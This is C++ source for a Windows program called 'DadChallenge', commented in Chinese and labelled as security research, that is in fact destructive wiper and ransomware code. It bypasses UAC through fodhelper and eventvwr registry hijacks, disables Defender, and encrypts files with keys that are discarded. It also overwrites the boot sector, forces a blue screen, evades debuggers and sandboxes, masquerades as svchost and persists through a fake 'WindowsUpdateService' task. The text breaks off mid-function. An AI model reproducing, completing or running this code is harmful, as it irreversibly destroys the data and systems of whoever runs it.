/**
 * @file    DadChallenge.cpp (Win7/10/11 兼容版)
 * @brief   爸爸挑战赛 - Windows安全研究程序 (兼容 Win7/10/11)
 * @warning 仅供安全研究与学习Windows防御机制，严禁非法使用！
 *
 * 兼容性处理：
 *   - Win7: 使用 eventvwr.exe 绕过UAC，计划任务使用 TASK_LOGON_S4U
 *   - Win10/11: 使用 fodhelper.exe 绕过UAC，计划任务使用 TASK_LOGON_SERVICE_ACCOUNT
 *   - Defender 禁用仅在 Win10+ 尝试
 *   - 其他内核保护功能全系统支持
 *
 * 功能列表：
 *   1. 独立守护进程（心跳检测）
 *   2. 进程关键保护 + 安全描述符（仅SYSTEM可终止）
 *   3. 反调试/反虚拟机/反沙箱（多维度检测）
 *   4. 多线程AES加密所有固定驱动器（修复CBC填充）
 *   5. 破坏磁盘引导扇区（MBR+GPT备份）
 *   6. UAC绕过（根据系统版本自动选择方法）
 *   7. 注册表自启动 + 计划任务持久化
 *   8. 伪装系统进程 + 自复制 + 删除源文件
 *   9. 蓝屏触发 + 遗书文件
 *  10. 交互式挑战（3次机会叫爸爸）
 */

#define _CRT_SECURE_NO_WARNINGS
#define _CRT_NONSTDC_NO_DEPRECATE
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <shellapi.h>
#include <iostream>
#include <string>
#include <fstream>
#include <sstream>
#include <vector>
#include <ctime>
#include <io.h>
#include <fcntl.h>
#include <tlhelp32.h>
#include <taskschd.h>
#include <comdef.h>
#include <shlwapi.h>
#include <bcrypt.h>
#include <sddl.h>
#include <aclapi.h>
#include <intrin.h>
#include <iphlpapi.h>
#include <winternl.h>
#include <winioctl.h>
#include <psapi.h>

#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsuppw.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "psapi.lib")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

 /* ===================== 字符串加密（避免静态特征） ===================== */
static const wchar_t* GetRegPath() {
    static wchar_t buf[] = { 'S','O','F','T','W','A','R','E','\\','D','a','d','C','h','a','l','l','e','n','g','e',0 };
    return buf;
}
static const wchar_t* GetSafeValue() {
    static wchar_t buf[] = { 'S','a','f','e','S','t','a','t','u','s',0 };
    return buf;
}
static const wchar_t* GetEncDoneValue() {
    static wchar_t buf[] = { 'E','n','c','r','y','p','t','i','o','n','D','o','n','e',0 };
    return buf;
}
static const wchar_t* GetElevationEvent() {
    static wchar_t buf[] = { 'G','l','o','b','a','l','\\','D','a','d','C','h','a','l','l','e','n','g','e','E','l','e','v','a','t','i','o','n','D','o','n','e',0 };
    return buf;
}
static const wchar_t* GetGuardEvent() {
    static wchar_t buf[] = { 'G','l','o','b','a','l','\\','D','a','d','C','h','a','l','l','e','n','g','e','G','u','a','r','d','R','e','a','d','y',0 };
    return buf;
}

/* ===================== 全局变量 ===================== */
HANDLE g_hStopEvent = NULL;             // 停止事件（保留，未使用）
HANDLE g_hWatchdogThread = NULL;        // 看门狗线程（保留）
HANDLE g_hGuardProcess = NULL;          // 守护进程句柄
volatile LONG g_lastHeartbeat = 0;      // 心跳时间戳

/* ===================== 动态API结构（减少导入表特征） ===================== */
typedef struct _DYNAMIC_APIS {
    // ntdll
    NTSTATUS(NTAPI* NtRaiseHardError)(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);
    NTSTATUS(NTAPI* RtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
    NTSTATUS(NTAPI* RtlSetProcessIsCritical)(BOOLEAN, PBOOLEAN, BOOLEAN);
    NTSTATUS(NTAPI* NtSetInformationProcess)(HANDLE, ULONG, PVOID, ULONG);
    NTSTATUS(NTAPI* NtQueryInformationProcess)(HANDLE, ULONG, PVOID, ULONG, PULONG);
    // kernel32
    BOOL(WINAPI* IsDebuggerPresent)(VOID);
} DYNAMIC_APIS;

DYNAMIC_APIS g_apis = { 0 };

/* ===================== 函数前置声明（解决顺序依赖） ===================== */
void LoadDynamicApis();
void TakeAllPrivileges();
void EnableCriticalProcess(bool enable);
void TriggerBSOD();
BOOL SetStrictProcessProtection();
void UpdateHeartbeat();
DWORD WINAPI GuardProcessWithHeartbeat(LPVOID lpParam);
void CorruptBootSector();
bool EncryptFileAES_CBC(const std::wstring& filePath);
bool IsDebuggedOrVM_Enhanced();
void DisableDefenderRealtime();
void WriteDeathNote();
void Countdown(int seconds);
std::wstring SanitizeInput(const std::wstring& raw);
BOOL IsElevated();
void DisguiseAsSystemProcess();
void InstallScheduledTask();
BOOL BypassUAC();                           // 统一UAC绕过接口，自动选择方法
void HideConsole(bool hide);
void WriteSafeStatus(bool safe);
int ReadSafeStatus();
void SelfCopyAndDelete();
void Cleanup();
void SetupRegistryRun();
bool IsAlreadyEncrypted();
void SetEncryptionDone();
void StartEncryption();
void RandomDelayForSandbox();
void ShowChallengeUI();
BOOL IsWindows8OrHigher();                  // 检测系统版本

/* ===================== 动态加载API ===================== */
/**
 * @brief 动态加载敏感API
 */
void LoadDynamicApis() {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    HMODULE kernel32 = GetModuleHandleW(L"kernel32.dll");
    if (ntdll) {
        g_apis.NtRaiseHardError = (decltype(g_apis.NtRaiseHardError))GetProcAddress(ntdll, "NtRaiseHardError");
        g_apis.RtlAdjustPrivilege = (decltype(g_apis.RtlAdjustPrivilege))GetProcAddress(ntdll, "RtlAdjustPrivilege");
        g_apis.RtlSetProcessIsCritical = (decltype(g_apis.RtlSetProcessIsCritical))GetProcAddress(ntdll, "RtlSetProcessIsCritical");
        g_apis.NtSetInformationProcess = (decltype(g_apis.NtSetInformationProcess))GetProcAddress(ntdll, "NtSetInformationProcess");
        g_apis.NtQueryInformationProcess = (decltype(g_apis.NtQueryInformationProcess))GetProcAddress(ntdll, "NtQueryInformationProcess");
    }
    if (kernel32) {
        g_apis.IsDebuggerPresent = (decltype(g_apis.IsDebuggerPresent))GetProcAddress(kernel32, "IsDebuggerPresent");
    }
}

/* ===================== 系统版本检测 ===================== */
/**
 * @brief 判断当前系统是否为 Windows 8 或更高版本（即支持 fodhelper 等新特性）
 * @return TRUE 表示 Win8+, FALSE 表示 Win7 或更早
 */
BOOL IsWindows8OrHigher() {
    typedef LONG(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return FALSE;
    RtlGetVersionPtr RtlGetVersion = (RtlGetVersionPtr)GetProcAddress(ntdll, "RtlGetVersion");
    if (!RtlGetVersion) return FALSE;

    RTL_OSVERSIONINFOW osvi = { 0 };
    osvi.dwOSVersionInfoSize = sizeof(osvi);
    if (RtlGetVersion(&osvi) != 0) return FALSE;

    // 主版本号 >= 6.2 即为 Windows 8 或更高 (Win8=6.2, Win10=10.0, Win11=10.0)
    return (osvi.dwMajorVersion > 6) || (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion >= 2);
}

/* ===================== 特权提升函数 ===================== */
/**
 * @brief 启用进程所需特权（关闭、调试、所有权、配额）
 */
void TakeAllPrivileges() {
    if (!g_apis.RtlAdjustPrivilege) return;
    BOOLEAN b;
    // SeShutdownPrivilege (19) - 允许关机/蓝屏
    g_apis.RtlAdjustPrivilege(19, TRUE, FALSE, &b);
    // SeDebugPrivilege (20) - 允许调试其他进程
    g_apis.RtlAdjustPrivilege(20, TRUE, FALSE, &b);
    // SeTakeOwnershipPrivilege (25) - 允许取得文件所有权
    g_apis.RtlAdjustPrivilege(25, TRUE, FALSE, &b);
    // SeIncreaseQuotaPrivilege (23) - 用于设置关键进程
    g_apis.RtlAdjustPrivilege(23, TRUE, FALSE, &b);
}

/* ===================== 关键进程保护 ===================== */
/**
 * @brief 设置或解除进程为关键进程（终止时蓝屏）
 * @param enable true=成为关键进程, false=取消
 */
void EnableCriticalProcess(bool enable) {
    if (!g_apis.RtlSetProcessIsCritical) return;
    BOOLEAN bOld;
    g_apis.RtlSetProcessIsCritical(enable ? TRUE : FALSE, &bOld, FALSE);
}

/* ===================== 蓝屏触发 ===================== */
/**
 * @brief 触发系统蓝屏（需要SeShutdownPrivilege）
 */
void TriggerBSOD() {
    if (!g_apis.RtlAdjustPrivilege || !g_apis.NtRaiseHardError) return;
    BOOLEAN b;
    ULONG uResp;
    g_apis.RtlAdjustPrivilege(19, TRUE, FALSE, &b);
    g_apis.NtRaiseHardError((NTSTATUS)0xC0054188, 0, 0, NULL, 6, &uResp);
}

/* ===================== 严格安全描述符保护 ===================== */
/**
 * @brief 设置进程安全描述符，仅允许SYSTEM完全控制，Administrator只有读/执行权限（无法终止）
 * @return 是否成功
 */
BOOL SetStrictProcessProtection() {
    PSECURITY_DESCRIPTOR pSD = NULL;
    // D:P(A;;GA;;;SY)(A;;GXGR;;;BA)
    // GA = GENERIC_ALL, GX = GENERIC_EXECUTE, GR = GENERIC_READ
    if (!ConvertStringSecurityDescriptorToSecurityDescriptorW(
        L"D:P(A;;GA;;;SY)(A;;GXGR;;;BA)", SDDL_REVISION_1, &pSD, NULL))
        return FALSE;
    BOOL result = SetSecurityInfo(GetCurrentProcess(), SE_KERNEL_OBJECT,
        DACL_SECURITY_INFORMATION, NULL, NULL, (PACL)pSD, NULL);
    LocalFree(pSD);
    return result;
}

/* ===================== 心跳机制 ===================== */
/**
 * @brief 更新心跳时间（由主进程每秒调用）
 */
void UpdateHeartbeat() {
    InterlockedExchange(&g_lastHeartbeat, (LONG)time(NULL));
}

/**
 * @brief 守护进程主函数（带心跳检测）
 * @param lpParam 父进程PID
 */
DWORD WINAPI GuardProcessWithHeartbeat(LPVOID lpParam) {
    DWORD parentPID = (DWORD)(ULONG_PTR)lpParam;
    HANDLE hParent = OpenProcess(SYNCHRONIZE, FALSE, parentPID);
    if (!hParent) return 1;

    // 通知主进程守护已就绪
    HANDLE hReady = OpenEventW(EVENT_MODIFY_STATE, FALSE, GetGuardEvent());
    if (hReady) {
        SetEvent(hReady);
        CloseHandle(hReady);
    }

    // 守护进程自保护
    EnableCriticalProcess(true);
    SetStrictProcessProtection();

    while (true) {
        // 如果父进程已退出，跳出循环
        if (WaitForSingleObject(hParent, 0) == WAIT_OBJECT_0) break;

        // 检查心跳：如果距离上次心跳超过8秒，认为主进程异常
        time_t now = time(NULL);
        LONG last = InterlockedCompareExchange(&g_lastHeartbeat, 0, 0);
        if (now - last > 8) {
            // 标记不安全，开始破坏
            WriteSafeStatus(false);
            StartEncryption();           // 加密文件
            Sleep(3000);
            CorruptBootSector();         // 破坏引导扇区
            WriteDeathNote();            // 写遗书
            Sleep(500);
            TriggerBSOD();               // 蓝屏
            while (1) Sleep(1000);      // 死循环
        }
        Sleep(1000);
    }
    CloseHandle(hParent);
    return 0;
}

/* ===================== 破坏引导扇区 ===================== */
/**
 * @brief 覆盖物理磁盘0的前两个扇区（MBR和GPT备份），使系统无法启动
 */
void CorruptBootSector() {
    HANDLE hDrive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_EXISTING, 0, NULL);
    if (hDrive != INVALID_HANDLE_VALUE) {
        BYTE junk[512] = { 0 };
        DWORD written;
        // 覆盖主引导记录（MBR）
        WriteFile(hDrive, junk, 512, &written, NULL);
        // 覆盖GPT备份（第二个扇区）
        SetFilePointer(hDrive, 512 * 2, NULL, FILE_BEGIN);
        WriteFile(hDrive, junk, 512, &written, NULL);
        CloseHandle(hDrive);
    }
}

/* ===================== AES-CBC加密（修复PKCS7填充） ===================== */
/**
 * @brief 使用AES-256-CBC加密文件，随机IV，CBC模式并正确处理PKCS7填充
 * @param filePath 文件路径
 * @return 是否成功
 */
bool EncryptFileAES_CBC(const std::wstring& filePath) {
    const DWORD BLOCK_SIZE = 16;  // AES块大小16字节
    std::wstring tempPath = filePath + L".enc";

    HANDLE hSource = CreateFileW(filePath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hSource == INVALID_HANDLE_VALUE) return false;

    LARGE_INTEGER fileSize;
    if (!GetFileSizeEx(hSource, &fileSize) || fileSize.QuadPart == 0) {
        CloseHandle(hSource);
        return true;  // 空文件跳过
    }

    HANDLE hDest = CreateFileW(tempPath.c_str(), GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDest == INVALID_HANDLE_VALUE) {
        CloseHandle(hSource);
        return false;
    }

    BCRYPT_ALG_HANDLE hAlg = NULL;
    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0))) {
        CloseHandle(hSource); CloseHandle(hDest);
        DeleteFileW(tempPath.c_str());
        return false;
    }

    // 生成随机密钥和IV
    BYTE key[32], iv[16];
    if (!BCRYPT_SUCCESS(BCryptGenRandom(hAlg, key, sizeof(key), 0)) ||
        !BCRYPT_SUCCESS(BCryptGenRandom(hAlg, iv, sizeof(iv), 0))) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        CloseHandle(hSource); CloseHandle(hDest);
        DeleteFileW(tempPath.c_str());
        return false;
    }

    BCRYPT_KEY_HANDLE hKey = NULL;
    if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, key, sizeof(key), 0))) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        CloseHandle(hSource); CloseHandle(hDest);
        DeleteFileW(tempPath.c_str());
        return false;
    }

    DWORD written;
    WriteFile(hDest, iv, sizeof(iv), &written, NULL);  // 存储IV供解密（但我们不解密）

    std::vector<BYTE> buffer(BLOCK_SIZE * 1024);       // 16KB缓冲区
    BYTE prevCipherBlock[16] = { 0 };
    memcpy(prevCipherBlock, iv, 16);
    bool success = true;

    while (true) {
        DWORD bytesRead = 0;
        if (!ReadFile(hSource, buffer.data(), (DWORD)buffer.size(), &bytesRead, NULL) || bytesRead == 0)
            break;

        bool isLastBlock = (bytesRead < buffer.size());  // 最后一次读取

        if (isLastBlock) {
            // PKCS7填充：计算需要填充的字节数
            DWORD padding = BLOCK_SIZE - (bytesRead % BLOCK_SIZE);
            if (padding == 0) padding = BLOCK_SIZE;
            std::vector<BYTE> paddedData(bytesRead + padding);
            memcpy(paddedData.data(), buffer.data(), bytesRead);
            for (DWORD i = 0; i < padding; i++) {
                paddedData[bytesRead + i] = (BYTE)padding;
            }

            ULONG cipherSize = 0;
            NTSTATUS status = BCryptEncrypt(hKey, paddedData.data(), (ULONG)paddedData.size(),
                NULL, prevCipherBlock, 16, NULL, 0, &cipherSize, BCRYPT_BLOCK_PADDING);
            if (!BCRYPT_SUCCESS(status)) { success = false; break; }
            std::vector<BYTE> cipher(cipherSize);
            status = BCryptEncrypt(hKey, paddedData.data(), (ULONG)paddedData.size(),
                NULL, prevCipherBlock, 16, cipher.data(), cipherSize, &cipherSize, BCRYPT_BLOCK_PADDING);
            if (!BCRYPT_SUCCESS(status)) { success = false; break; }
            if (!WriteFile(hDest, cipher.data(), cipherSize, &written, NULL)) {
                success = false;
                break;
            }
            break;  // 文件结束
        }
        else {
            // 非最后一块：直接加密（无需填充）
            ULONG cipherSize = 0;
            NTSTATUS status = BCryptEncrypt(hKey, buffer.data(), bytesRead,
                NULL, prevCipherBlock, 16, NULL, 0, &cipherSize, 0);
            if (!BCRYPT_SUCCESS(status)) { success = false; break; }
            std::vector<BYTE> cipher(cipherSize);
            status = BCryptEncrypt(hKey, buffer.data(), bytesRead,
                NULL, prevCipherBlock, 16, cipher.data(), cipherSize, &cipherSize, 0);
            if (!BCRYPT_SUCCESS(status)) { success = false; break; }
            // 更新prevCipherBlock为密文的最后一个块
            if (cipherSize >= 16)
                memcpy(prevCipherBlock, cipher.data() + cipherSize - 16, 16);
            if (!WriteFile(hDest, cipher.data(), cipherSize, &written, NULL)) {
                success = false;
                break;
            }
        }
    }

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    CloseHandle(hSource);
    CloseHandle(hDest);

    if (success) {
        // 替换原文件
        if (!MoveFileExW(tempPath.c_str(), filePath.c_str(), MOVEFILE_REPLACE_EXISTING)) {
            DeleteFileW(tempPath.c_str());
            success = false;
        }
    }
    else {
        DeleteFileW(tempPath.c_str());
    }
    return success;
}

/* ===================== 反虚拟机/反沙箱增强检测 ===================== */
/**
 * @brief 多维度检测调试器、虚拟机、沙箱环境
 * @return true表示检测到危险环境
 */
bool IsDebuggedOrVM_Enhanced() {
    // 1. 调试器API检测
    if (g_apis.IsDebuggerPresent && g_apis.IsDebuggerPresent()) return true;
    BOOL bDebug = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &bDebug);
    if (bDebug) return true;

    // 2. PEB BeingDebugged
    PPEB peb = NtCurrentTeb()->ProcessEnvironmentBlock;
    if (peb->BeingDebugged) return true;

    // 3. CPU核心数（沙箱常给单核）
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) return true;

    // 4. 物理内存（沙箱常小于2GB）
    MEMORYSTATUSEX mem;
    mem.dwLength = sizeof(mem);
    GlobalMemoryStatusEx(&mem);
    if (mem.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) return true;

    // 5. 磁盘总容量（沙箱常小于40GB）
    ULARGE_INTEGER totalBytes;
    GetDiskFreeSpaceExW(L"C:\\", NULL, &totalBytes, NULL);
    if (totalBytes.QuadPart < 40ULL * 1024 * 1024 * 1024) return true;

    // 6. CPUID hypervisor位
    int cpuInfo[4] = {};
    __cpuid(cpuInfo, 0x1);
    if (cpuInfo[2] & (1 << 31)) return true;

    // 7. 检测常见虚拟机文件/注册表（可选，保留原始检测）
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"HARDWARE\\ACPI\\DSDT\\VBOX__", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey); return true;
    }
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"HARDWARE\\ACPI\\DSDT\\VMWARE__", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey); return true;
    }

    return false;
}

/* ===================== 尝试禁用Windows Defender实时监控（仅Win10+） ===================== */
/**
 * @brief 通过注册表禁用Defender实时监控（需要管理员权限，部分系统可能被忽略）
 *        注意：Win7无此功能，自动跳过
 */
void DisableDefenderRealtime() {
    // 仅在 Windows 8 或更高版本上尝试（Win7无内置Defender或不同机制）
    if (!IsWindows8OrHigher()) return;

    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        DWORD val = 1;
        RegSetValueExW(hKey, L"DisableRealtimeMonitoring", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
        RegCloseKey(hKey);
    }
}

/* ===================== UAC 绕过（兼容Win7/10/11） ===================== */
/**
 * @brief 统一的UAC绕过接口，根据系统版本自动选择方法
 * @return 是否成功触发提权
 *
 * Win10+ : 使用 fodhelper.exe 方法
 * Win7   : 使用 eventvwr.exe / mscfile 方法
 */
BOOL BypassUAC() {
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    std::wstring cmd = L"cmd /c \"" + std::wstring(exePath) + L"\" /silent /nohide";

    if (IsWindows8OrHigher()) {
        // Win8+ 使用 fodhelper 绕过（适用于 Win10/11）
        HKEY hKey;
        if (RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings\\shell\\open\\command",
            0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS) return FALSE;
        RegSetValueExW(hKey, NULL, 0, REG_SZ, (BYTE*)cmd.c_str(), (DWORD)((cmd.size() + 1) * sizeof(wchar_t)));
        RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ, (BYTE*)L"", 2);
        RegCloseKey(hKey);

        HANDLE hEvent = CreateEventW(NULL, TRUE, FALSE, GetElevationEvent());
        if (!hEvent) return FALSE;
        ShellExecuteW(NULL, L"open", L"fodhelper.exe", NULL, NULL, SW_HIDE);
        DWORD waitResult = WaitForSingleObject(hEvent, 30000);
        CloseHandle(hEvent);
        RegDeleteTreeW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings");
        return (waitResult == WAIT_OBJECT_0);
    }
    else {
        // Win7 使用 eventvwr.exe 方法（通过 mscfile 注册表键）
        HKEY hKey;
        if (RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Classes\\mscfile\\shell\\open\\command",
            0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS) return FALSE;
        RegSetValueExW(hKey, NULL, 0, REG_SZ, (BYTE*)cmd.c_str(), (DWORD)((cmd.size() + 1) * sizeof(wchar_t)));
        RegCloseKey(hKey);

        HANDLE hEvent = CreateEventW(NULL, TRUE, FALSE, GetElevationEvent());
        if (!hEvent) return FALSE;
        ShellExecuteW(NULL, L"open", L"eventvwr.exe", NULL, NULL, SW_HIDE);
        DWORD waitResult = WaitForSingleObject(hEvent, 30000);
        CloseHandle(hEvent);
        RegDeleteTreeW(HKEY_CURRENT_USER, L"Software\\Classes\\mscfile");
        return (waitResult == WAIT_OBJECT_0);
    }
}

/* ===================== 遗书文件（你完了.txt） ===================== */
/**
 * @brief 创建并打开文本文档，包含威胁信息
 */
void WriteDeathNote() {
    const wchar_t* txtPath = L"你完了.txt";
    HANDLE hFile = CreateFileW(txtPath, GENERIC_WRITE, FILE_SHARE_READ, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    WORD bom = 0xFEFF;  // UTF-16 BOM
    DWORD written;
    WriteFile(hFile, &bom, sizeof(bom), &written, NULL);
    const wchar_t* note =
        L"你完了！！！\r\n\r\n"
        L"你有3次机会叫爸爸。\r\n"
        L"你一次都没叫。\r\n\r\n"
        L"现在电脑要蓝屏了，而且你的文件已被永久加密。\r\n"
        L"自作自受。\r\n\r\n"
        L"——陶修夷 留\r\n";
    WriteFile(hFile, note, (DWORD)(wcslen(note) * sizeof(wchar_t)), &written, NULL);
    CloseHandle(hFile);
    ShellExecuteW(NULL, L"open", txtPath, NULL, NULL, SW_SHOW);
}

/**
 * @brief 倒计时显示
 * @param seconds 秒数
 */
void Countdown(int seconds) {
    for (int i = seconds; i > 0; i--) {
        std::wcout << L"  " << i << L" 秒后蓝屏..." << std::endl;
        Sleep(1000);
    }
}

/**
 * @brief 清洗用户输入（去空格、转小写）
 * @param raw 原始输入
 * @return 处理后字符串
 */
std::wstring SanitizeInput(const std::wstring& raw) {
    std::wstring s = raw;
    while (!s.empty() && (s.back() == L' ' || s.back() == L'\r' || s.back() == L'\n' || s.back() == L'\t'))
        s.pop_back();
    size_t start = 0;
    while (start < s.length() && (s[start] == L' ' || s[start] == L'\t'))
        start++;
    s = s.substr(start);
    for (auto& c : s) c = towlower(c);
    return s;
}

/**
 * @brief 检查进程是否以管理员权限运行
 */
BOOL IsElevated() {
    BOOL fRet = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION Elevation;
        DWORD cbSize = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
            fRet = Elevation.TokenIsElevated;
        }
        CloseHandle(hToken);
    }
    return fRet;
}

/**
 * @brief 伪装进程为 svchost.exe（修改PEB中的路径）
 */
void DisguiseAsSystemProcess() {
    const wchar_t* fakePath = L"C:\\Windows\\System32\\svchost.exe";
    if (!g_apis.NtQueryInformationProcess) return;

    typedef struct _PROCESS_BASIC_INFORMATION {
        NTSTATUS ExitStatus;
        PEB* PebBaseAddress;
        ULONG_PTR AffinityMask;
        LONG BasePriority;
        ULONG_PTR UniqueProcessId;
        ULONG_PTR InheritedFromUniqueProcessId;
    } PROCESS_BASIC_INFORMATION;

    PROCESS_BASIC_INFORMATION pbi = { 0 };
    ULONG returnLength;
    NTSTATUS status = g_apis.NtQueryInformationProcess(GetCurrentProcess(), 0, &pbi, sizeof(pbi), &returnLength);
    if (status != 0) return;

    PEB* peb = pbi.PebBaseAddress;
    if (!peb) return;
    RTL_USER_PROCESS_PARAMETERS* params = peb->ProcessParameters;
    if (!params) return;

    size_t len = wcslen(fakePath) * sizeof(wchar_t);
    wchar_t* newBuf = (wchar_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, len + sizeof(wchar_t));
    if (!newBuf) return;
    wcscpy_s(newBuf, len / sizeof(wchar_t) + 1, fakePath);

    params->ImagePathName.Buffer = newBuf;
    params->ImagePathName.Length = (USHORT)len;
    params->ImagePathName.MaximumLength = (USHORT)(len + sizeof(wchar_t));
    params->CommandLine.Buffer = newBuf;
    params->CommandLine.Length = (USHORT)len;
    params->CommandLine.MaximumLength = (USHORT)(len + sizeof(wchar_t));
}

/**
 * @brief 创建开机计划任务（SYSTEM权限，兼容Win7/10/11）
 */
void InstallScheduledTask() {
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) return;
    ITaskService* pService = NULL;
    hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService);
    if (FAILED(hr)) { CoUninitialize(); return; }
    hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
    if (FAILED(hr)) { pService->Release(); CoUninitialize(); return; }
    ITaskFolder* pRootFolder = NULL;
    hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
    if (FAILED(hr)) { pService->Release(); CoUninitialize(); return; }
    ITaskDefinition* pDef = NULL;
    hr = pService->NewTask(0, &pDef);
    if (SUCCEEDED(hr) && pDef) {
        IPrincipal* pPrincipal = NULL;
        pDef->get_Principal(&pPrincipal);
        if (pPrincipal) {
            pPrincipal->put_UserId(_bstr_t(L"SYSTEM"));
            // 根据系统版本选择不同的登录类型（Win7 不支持 SERVICE_ACCOUNT）
            if (IsWindows8OrHigher()) {
                pPrincipal->put_LogonType(TASK_LOGON_SERVICE_ACCOUNT);
            }
            else {
                pPrincipal->put_LogonType(TASK_LOGON_S4U);  // Win7 兼容
            }
            pPrincipal->put_RunLevel(TASK_RUNLEVEL_HIGHEST);
            pPrincipal->Release();
        }
        ITriggerCollection* pTriggers = NULL;
        pDef->get_Triggers(&pTriggers);
        if (pTriggers) {
            ITrigger* pTrigger = NULL;
            pTriggers->Create(TASK_TRIGGER_BOOT, &pTrigger);
            if (pTrigger) pTrigger->Release();
            pTriggers->Release();
        }
        IActionCollection* pActions = NULL;
        pDef->get_Actions(&pActions);
        if (pActions) {
            IAction* pAction = NULL;
            pActions->Create(TASK_ACTION_EXEC, &pAction);
            if (pAction) {
                IExecAction* pExecAction = NULL;
                pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
                if (pExecAction) {
                    wchar_t exePath[MAX_PATH];
                    GetModuleFileNameW(NULL, exePath, MAX_PATH);
                    pExecAction->put_Path(_bstr_t(exePath));
                    pExecAction->put_Arguments(_bstr_t(L"/silent /nohide"));
                    pExecAction->Release();
                }
                pAction->Release();
            }
            pActions->Release();
        }
        IRegisteredTask* pRegTask = NULL;
        pRootFolder->RegisterTaskDefinition(_bstr_t(L"WindowsUpdateService"), pDef, TASK_CREATE_OR_UPDATE,
            _variant_t(), _variant_t(), TASK_LOGON_SERVICE_ACCOUNT, _variant_t(), &pRegTask);
        if (pRegTask) pRegTask->Release();
        pDef->Release();
    }
    pRootFolder->Release();
    pService->Release();
    CoUninitialize();
}

/* 注意：原 BypassUAC_FodHelper 函数已被统一的 BypassUAC 替代，以下保留原名称但调用新函数（兼容旧代码调用） */
BOOL BypassUAC_FodHelper() {
    return BypassUAC();
}

/**
 * @brief 隐藏或显示控制台窗口
 * @param hide true=隐藏, false=显示
 */
void HideConsole(bool hide) {
    if (hide) {
        FreeConsole();
    }
    else {
        AllocConsole();
        ShowWindow(GetConsoleWindow(), SW_SHOW);
        (void)_setmode(_fileno(stdout), _O_U16TEXT);
        (void)_setmode(_fileno(stdin), _O_U16TEXT);
    }
}

/**
 * @brief 写入安全状态到注册表（1=通过挑战, 0=未通过）
 */
void WriteSafeStatus(bool safe) {
    HKEY hKey;
    RegCreateKeyExW(HKEY_LOCAL_MACHINE, GetRegPath(), 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL);
    DWORD val = safe ? 1 : 0;
    RegSetValueExW(hKey, GetSafeValue(), 0, REG_DWORD, (BYTE*)&val, sizeof(DWORD));
    RegCloseKey(hKey);
}

/**
 * @brief 读取安全状态
 * @return -1=未创建, 0=不安全, 1=安全
 */
int ReadSafeStatus() {
    DWORD val = 0;
    DWORD size = sizeof(DWORD);
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, GetRegPath(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegQueryValueExW(hKey, GetSafeValue(), NULL, NULL, (BYTE*)&val, &size);
        RegCloseKey(hKey);
        return (int)val;
    }
    return -1;
}

/**
 * @brief 自复制到System32并删除原始文件
 */
void SelfCopyAndDelete() {
    wchar_t targetDir[MAX_PATH];
